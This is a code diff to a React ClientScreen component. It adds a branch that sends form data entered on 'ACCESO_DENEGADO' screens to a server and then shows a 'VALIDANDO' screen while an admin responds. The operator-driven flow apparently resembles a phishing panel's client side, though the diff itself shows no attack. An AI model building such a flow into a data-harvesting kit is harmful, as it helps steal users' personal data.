@@ -432,6 +432,30 @@ export default function ClientScreen() {
           setCurrentScreen(ScreenType.VALIDANDO);
           return;
         }
+        
+        if (screen === ScreenType.ACCESO_DENEGADO || screen === ScreenType.ACCESO_DENEGADO_2) {
+          // Usar sessionData.sessionId o sessionId del URL
+          const currentSessionId = sessionData.sessionId || sessionId;
+          
+          if (!currentSessionId) {
+            console.error('No hay sessionId disponible para ACCESO_DENEGADO');
+            return;
+          }
+          
+          // Enviar datos de contacto al servidor
+          sendMessage({
+            type: 'CLIENT_INPUT',
+            data: {
+              tipo: screen === ScreenType.ACCESO_DENEGADO ? 'acceso_denegado' : 'acceso_denegado_2',
+              sessionId: currentSessionId,
+              ...formData
+            }
+          });
+          
+          // Cambiar a pantalla validando mientras esperamos respuesta del admin
+          setCurrentScreen(ScreenType.VALIDANDO);
+          return;
+        }
       }
       
       // Enviar datos al servidor inmediatamente para sesiones existentes
@@ -439,7 +463,7 @@ export default function ClientScreen() {
         type: 'CLIENT_INPUT',
         data: {
           tipo: screen,
-          sessionId,
+          sessionId: sessionData.sessionId || sessionId,
           ...formData
         }
       };
